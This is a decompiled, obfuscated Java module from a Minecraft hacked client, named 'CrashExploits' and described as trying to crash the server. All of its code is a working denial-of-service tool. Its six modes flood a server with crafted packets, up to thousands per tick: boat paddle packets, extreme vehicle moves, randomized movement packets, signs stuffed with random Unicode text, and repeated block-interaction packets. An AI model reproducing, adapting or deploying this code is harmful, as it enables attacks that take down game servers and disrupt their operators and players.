/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  net.minecraft.class_1268
 *  net.minecraft.class_1297
 *  net.minecraft.class_1690
 *  net.minecraft.class_2350
 *  net.minecraft.class_243
 *  net.minecraft.class_2596
 *  net.minecraft.class_2827
 *  net.minecraft.class_2828
 *  net.minecraft.class_2828$class_2830
 *  net.minecraft.class_2833
 *  net.minecraft.class_2836
 *  net.minecraft.class_2877
 *  net.minecraft.class_2885
 *  net.minecraft.class_2886
 *  net.minecraft.class_3965
 */
package minegame159.meteorclient.systems.modules.bedtrap;

import java.util.Objects;
import java.util.Random;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.game.GameLeftEvent;
import minegame159.meteorclient.events.world.PlaySoundEvent;
import minegame159.meteorclient.events.world.TickEvent;
import minegame159.meteorclient.settings.BoolSetting;
import minegame159.meteorclient.settings.DoubleSetting;
import minegame159.meteorclient.settings.EnumSetting;
import minegame159.meteorclient.settings.IntSetting;
import minegame159.meteorclient.settings.Setting;
import minegame159.meteorclient.settings.SettingGroup;
import minegame159.meteorclient.systems.modules.Categories;
import minegame159.meteorclient.systems.modules.Module;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.class_1268;
import net.minecraft.class_1297;
import net.minecraft.class_1690;
import net.minecraft.class_2350;
import net.minecraft.class_243;
import net.minecraft.class_2596;
import net.minecraft.class_2827;
import net.minecraft.class_2828;
import net.minecraft.class_2833;
import net.minecraft.class_2836;
import net.minecraft.class_2877;
import net.minecraft.class_2885;
import net.minecraft.class_2886;
import net.minecraft.class_3965;

public class CrashExploits
extends Module {
    private final /* synthetic */ Setting<Double> speed;
    private final /* synthetic */ Setting<Mode> CMode;
    private final /* synthetic */ Setting<Integer> amount;
    private final /* synthetic */ Setting<Boolean> autoDisable;
    /* synthetic */ class_2836 boat_packet;
    private final /* synthetic */ SettingGroup sgGeneral;
    private final /* synthetic */ Setting<Boolean> noSound;

    @EventHandler
    private void onGameLeft(GameLeftEvent llllllllllllllllllllIlIIlIlllllI) {
        CrashExploits llllllllllllllllllllIlIIlIllllIl;
        if (!llllllllllllllllllllIlIIlIllllIl.autoDisable.get().booleanValue()) {
            return;
        }
        llllllllllllllllllllIlIIlIllllIl.toggle();
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent llllllllllllllllllllIlIIllIIIIIl) {
        CrashExploits llllllllllllllllllllIlIIllIIIlII;
        if (llllllllllllllllllllIlIIllIIIlII.CMode.get() == Mode.Boat && llllllllllllllllllllIlIIllIIIlII.noSound.get().booleanValue() && llllllllllllllllllllIlIIllIIIIIl.sound.method_4775().toString().equals("minecraft:entity.boat.paddle_land") || llllllllllllllllllllIlIIllIIIIIl.sound.method_4775().toString().equals("minecraft:entity.boat.paddle_water")) {
            llllllllllllllllllllIlIIllIIIIIl.cancel();
        }
    }

    public static double rndD(double llllllllllllllllllllIlIIlIlllIlI) {
        Random llllllllllllllllllllIlIIlIlllIIl = new Random();
        return llllllllllllllllllllIlIIlIlllIIl.nextDouble() * llllllllllllllllllllIlIIlIlllIlI;
    }

    public CrashExploits() {
        super(Categories.BedTrap, "crash-exploits", "Tries to crash the server.");
        CrashExploits llllllllllllllllllllIlIIlllIlIll;
        llllllllllllllllllllIlIIlllIlIll.sgGeneral = llllllllllllllllllllIlIIlllIlIll.settings.getDefaultGroup();
        llllllllllllllllllllIlIIlllIlIll.CMode = llllllllllllllllllllIlIIlllIlIll.sgGeneral.add(new EnumSetting.Builder().name("Mode").description("Crash methods.").defaultValue(Mode.Boat).build());
        llllllllllllllllllllIlIIlllIlIll.speed = llllllllllllllllllllIlIIlllIlIll.sgGeneral.add(new DoubleSetting.Builder().name("speed").description("Speed in blocks per second. Only for Entity mode.").defaultValue(1337.0).min(1.0).sliderMax(10000.0).build());
        llllllllllllllllllllIlIIlllIlIll.amount = llllllllllllllllllllIlIIlllIlIll.sgGeneral.add(new IntSetting.Builder().name("packets").description("How many packets to send to the server per tick. Only for Boat, Entity, Movement, PacketSpam, Sign, UnnamedCrash mode.").defaultValue(100).min(1).sliderMax(10000).build());
        llllllllllllllllllllIlIIlllIlIll.noSound = llllllllllllllllllllIlIIlllIlIll.sgGeneral.add(new BoolSetting.Builder().name("no-sound").description("Blocks the noisy paddle sounds. Only for Boat mode.").defaultValue(false).build());
        llllllllllllllllllllIlIIlllIlIll.autoDisable = llllllllllllllllllllIlIIlllIlIll.sgGeneral.add(new BoolSetting.Builder().name("auto-disable").description("Disables module on kick.").defaultValue(false).build());
        llllllllllllllllllllIlIIlllIlIll.boat_packet = new class_2836(true, true);
    }

    public double getDistributedRandom(double llllllllllllllllllllIlIIlIllIIll) {
        return CrashExploits.rndD(llllllllllllllllllllIlIIlIllIIll) - llllllllllllllllllllIlIIlIllIIll / 2.0;
    }

    @Override
    public void onActivate() {
        CrashExploits llllllllllllllllllllIlIIlllIlIIl;
        if (llllllllllllllllllllIlIIlllIlIIl.CMode.get() == Mode.Entity) {
            assert (llllllllllllllllllllIlIIlllIlIIl.mc.field_1724 != null);
            if (llllllllllllllllllllIlIIlllIlIIl.mc.field_1724.method_5854() == null) {
                ChatUtils.info("You must be riding an entity - disabling.", new Object[0]);
                llllllllllllllllllllIlIIlllIlIIl.toggle();
            }
        }
    }

    public static String rndBinStr(int llllllllllllllllllllIlIIlIlIlllI) {
        StringBuilder llllllllllllllllllllIlIIlIlIllIl = new StringBuilder();
        for (int llllllllllllllllllllIlIIlIlIllll = 0; llllllllllllllllllllIlIIlIlIllll < llllllllllllllllllllIlIIlIlIlllI; ++llllllllllllllllllllIlIIlIlIllll) {
            llllllllllllllllllllIlIIlIlIllIl.append((char)new Random().nextInt(65535));
        }
        return String.valueOf(llllllllllllllllllllIlIIlIlIllIl);
    }

    @EventHandler
    private void onTick(TickEvent.Post llllllllllllllllllllIlIIllIlIIII) {
        CrashExploits llllllllllllllllllllIlIIllIlIIIl;
        assert (llllllllllllllllllllIlIIllIlIIIl.mc.field_1724 != null);
        class_1297 llllllllllllllllllllIlIIllIIllll = llllllllllllllllllllIlIIllIlIIIl.mc.field_1724.method_5854();
        class_1297 llllllllllllllllllllIlIIllIIlllI = llllllllllllllllllllIlIIllIlIIIl.mc.field_1724.method_5854();
        if (llllllllllllllllllllIlIIllIlIIIl.CMode.get() == Mode.Boat) {
            if (!(llllllllllllllllllllIlIIllIIlllI instanceof class_1690)) {
                ChatUtils.info("You must be in a boat - disabling.", new Object[0]);
                llllllllllllllllllllIlIIllIlIIIl.toggle();
                return;
            }
            for (int llllllllllllllllllllIlIIlllIIIII = 0; llllllllllllllllllllIlIIlllIIIII < llllllllllllllllllllIlIIllIlIIIl.amount.get(); ++llllllllllllllllllllIlIIlllIIIII) {
                Objects.requireNonNull(llllllllllllllllllllIlIIllIlIIIl.mc.method_1562()).method_2883((class_2596)llllllllllllllllllllIlIIllIlIIIl.boat_packet);
            }
        }
        if (llllllllllllllllllllIlIIllIlIIIl.CMode.get() == Mode.Entity) {
            for (int llllllllllllllllllllIlIIllIlllIl = 0; llllllllllllllllllllIlIIllIlllIl < llllllllllllllllllllIlIIllIlIIIl.amount.get(); ++llllllllllllllllllllIlIIllIlllIl) {
                assert (llllllllllllllllllllIlIIllIIllll != null);
                class_243 llllllllllllllllllllIlIIllIlllll = llllllllllllllllllllIlIIllIIllll.method_19538();
                llllllllllllllllllllIlIIllIIllll.method_5814(llllllllllllllllllllIlIIllIlllll.field_1352, llllllllllllllllllllIlIIllIlllll.field_1351 + llllllllllllllllllllIlIIllIlIIIl.speed.get(), llllllllllllllllllllIlIIllIlllll.field_1350);
                class_2833 llllllllllllllllllllIlIIllIllllI = new class_2833(llllllllllllllllllllIlIIllIIllll);
                Objects.requireNonNull(llllllllllllllllllllIlIIllIlIIIl.mc.method_1562()).method_2883((class_2596)llllllllllllllllllllIlIIllIllllI);
            }
        }
        if (llllllllllllllllllllIlIIllIlIIIl.CMode.get() == Mode.Movement) {
            if (llllllllllllllllllllIlIIllIlIIIl.mc.method_1562() == null) {
                return;
            }
            try {
                class_243 llllllllllllllllllllIlIIllIllIlI = llllllllllllllllllllIlIIllIlIIIl.mc.field_1724.method_19538();
                for (int llllllllllllllllllllIlIIllIllIll = 0; llllllllllllllllllllIlIIllIllIll < llllllllllllllllllllIlIIllIlIIIl.amount.get(); ++llllllllllllllllllllIlIIllIllIll) {
                    class_2828.class_2830 llllllllllllllllllllIlIIllIlllII = new class_2828.class_2830(llllllllllllllllllllIlIIllIllIlI.field_1352 + llllllllllllllllllllIlIIllIlIIIl.getDistributedRandom(1.0), llllllllllllllllllllIlIIllIllIlI.field_1351 + llllllllllllllllllllIlIIllIlIIIl.getDistributedRandom(1.0), llllllllllllllllllllIlIIllIllIlI.field_1350 + llllllllllllllllllllIlIIllIlIIIl.getDistributedRandom(1.0), (float)CrashExploits.rndD(90.0), (float)CrashExploits.rndD(180.0), true);
                    llllllllllllllllllllIlIIllIlIIIl.mc.method_1562().method_2883((class_2596)llllllllllllllllllllIlIIllIlllII);
                }
            }
            catch (Exception llllllllllllllllllllIlIIllIllIIl) {
                ChatUtils.info("Stopping movement crash because an error occurred!", new Object[0]);
                llllllllllllllllllllIlIIllIlIIIl.toggle();
            }
        }
        if (llllllllllllllllllllIlIIllIlIIIl.CMode.get() == Mode.PacketSpam) {
            for (int llllllllllllllllllllIlIIllIllIII = 0; llllllllllllllllllllIlIIllIllIII < llllllllllllllllllllIlIIllIlIIIl.amount.get(); ++llllllllllllllllllllIlIIllIllIII) {
                llllllllllllllllllllIlIIllIlIIIl.mc.method_1562().method_2883((class_2596)new class_2828(Math.random() >= 0.5));
                llllllllllllllllllllIlIIllIlIIIl.mc.method_1562().method_2883((class_2596)new class_2827((long)((int)(Math.random() * 8.0))));
            }
        }
        if (llllllllllllllllllllIlIIllIlIIIl.CMode.get() == Mode.Sign) {
            for (int llllllllllllllllllllIlIIllIlIllI = 0; llllllllllllllllllllIlIIllIlIllI < llllllllllllllllllllIlIIllIlIIIl.amount.get(); ++llllllllllllllllllllIlIIllIlIllI) {
                assert (llllllllllllllllllllIlIIllIlIIIl.mc.field_1724 != null);
                class_2877 llllllllllllllllllllIlIIllIlIlll = new class_2877(llllllllllllllllllllIlIIllIlIIIl.mc.field_1724.method_24515(), CrashExploits.rndBinStr(598), CrashExploits.rndBinStr(598), CrashExploits.rndBinStr(598), CrashExploits.rndBinStr(598));
                Objects.requireNonNull(llllllllllllllllllllIlIIllIlIIIl.mc.method_1562()).method_2883((class_2596)llllllllllllllllllllIlIIllIlIlll);
            }
        }
        if (llllllllllllllllllllIlIIllIlIIIl.CMode.get() == Mode.UnnamedCrash) {
            if (llllllllllllllllllllIlIIllIlIIIl.mc.method_1562() == null) {
                return;
            }
            for (int llllllllllllllllllllIlIIllIlIIlI = 0; llllllllllllllllllllIlIIllIlIIlI < llllllllllllllllllllIlIIllIlIIIl.amount.get(); ++llllllllllllllllllllIlIIllIlIIlI) {
                assert (llllllllllllllllllllIlIIllIlIIIl.mc.field_1724 != null);
                class_3965 llllllllllllllllllllIlIIllIlIlIl = new class_3965(new class_243(0.5, 0.5, 0.5), class_2350.field_11033, llllllllllllllllllllIlIIllIlIIIl.mc.field_1724.method_24515(), false);
                class_2886 llllllllllllllllllllIlIIllIlIlII = new class_2886(class_1268.field_5808);
                class_2885 llllllllllllllllllllIlIIllIlIIll = new class_2885(class_1268.field_5808, llllllllllllllllllllIlIIllIlIlIl);
                llllllllllllllllllllIlIIllIlIIIl.mc.method_1562().method_2883((class_2596)llllllllllllllllllllIlIIllIlIlII);
                llllllllllllllllllllIlIIllIlIIIl.mc.method_1562().method_2883((class_2596)llllllllllllllllllllIlIIllIlIIll);
            }
        }
    }

    public static enum Mode {
        Boat,
        Entity,
        Movement,
        PacketSpam,
        Sign,
        UnnamedCrash;


        private Mode() {
            Mode llIlIllllIllll;
        }
    }
}

